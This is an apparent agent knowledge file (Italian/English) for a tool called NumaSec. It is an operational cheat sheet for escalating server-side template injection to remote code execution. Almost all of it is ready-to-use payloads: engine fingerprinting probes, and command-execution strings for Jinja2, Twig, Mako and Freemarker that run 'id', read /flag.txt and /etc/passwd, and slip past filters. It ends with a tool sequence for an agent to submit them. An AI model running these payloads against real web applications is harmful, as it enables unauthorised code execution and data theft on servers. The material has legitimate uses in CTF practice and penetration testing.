# Attack Chain: SSTI → RCE

Sequenza per escalare da Server-Side Template Injection a Remote Code Execution.

---

## 🔴 Quando Usare

- Input viene renderizzato da template engine
- Test `{{7*7}}` ritorna `49`
- Framework Python (Jinja2, Mako) o altri

---

## Phase 1: Identify Template Engine

```
# Polyglot test
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
*{7*7}

# Jinja2/Twig test
{{7*'7'}}  → 7777777 = Jinja2, 49 = Twig

# Mako
${7*7}

# Freemarker
${7*7}
<#assign x=7*7>${x}
```

---

## Phase 2: Jinja2 Exploitation (Python/Flask)

### Basic RCE
```python
# Accesso a os via config
{{ config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read() }}

# Via request
{{ request.application.__self__._get_data_for_json.__globals__['os'].popen('id').read() }}

# Via cycler
{{ cycler.__init__.__globals__.os.popen('id').read() }}

# Via joiner
{{ joiner.__init__.__globals__.os.popen('id').read() }}
```

### Bypass Filtri Comuni

```python
# Underscore bloccato
{{ lipsum.__globals__["os"].popen("id").read() }}
{{ lipsum|attr("__globals__")|attr("__getitem__")("os") }}

# Brackets bloccati
{{ lipsum|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('id')|attr('read')() }}

# Dot bloccato
{{ lipsum['__globals__']['os']['popen']('id')['read']() }}
```

---

## Phase 3: Twig Exploitation (PHP)

```twig
# Basic RCE
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("cat /flag.txt")}}

# Via filter
{{['cat /flag.txt']|filter('system')}}
{{['id']|map('system')|join}}

# Leggere file
{{"/etc/passwd"|file_excerpt(1,30)}}
```

---

## Phase 4: Mako Exploitation (Python)

```python
# Direct execution
<%
import os
x = os.popen('cat /flag.txt').read()
%>
${x}

# One-liner
${__import__("os").popen("cat /flag.txt").read()}
```

---

## Phase 5: Freemarker Exploitation (Java)

```freemarker
# Execute class
${"freemarker.template.utility.Execute"?new()("cat /flag.txt")}

<#assign ex = "freemarker.template.utility.Execute"?new()>
${ex("cat /flag.txt")}
```

---

## Phase 6: Common Bypass Techniques

### Attribute access via |attr()
```python
{{ ''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')() }}
```

### String concatenation
```python
{{ ''['__cla'+'ss__']['__mr'+'o__'][1]['__subcla'+'sses__']() }}
```

### Hex encoding
```python
{{ ''['\x5f\x5fclass\x5f\x5f'] }}
```

### request.args bypass
```python
# URL: ?a=__class__&b=__mro__
{{ ''[request.args.a][request.args.b] }}
```

---

## Decision Tree

```
SSTI Confirmed ({{7*7}}=49)?
├── Jinja2? 
│   ├── config accessible? → config.__class__...
│   ├── lipsum? → lipsum.__globals__...
│   └── Filters blocked? → Use |attr() chain
├── Twig?
│   └── _self.env.registerUndefinedFilterCallback
├── Mako?
│   └── ${__import__("os")...}
└── Unknown?
    └── Try each payload type
```

---

## Tool Sequence (NumaSec)

1. `submit` con `{{7*7}}` → Confirm SSTI
2. `submit` con `{{7*'7'}}` → Identify engine
3. `submit` RCE payload appropriato
4. Se blocked: `submit` con bypass (attr, concat, hex)
5. `read_knowledge ssti_advanced_bypasses` per altri bypass
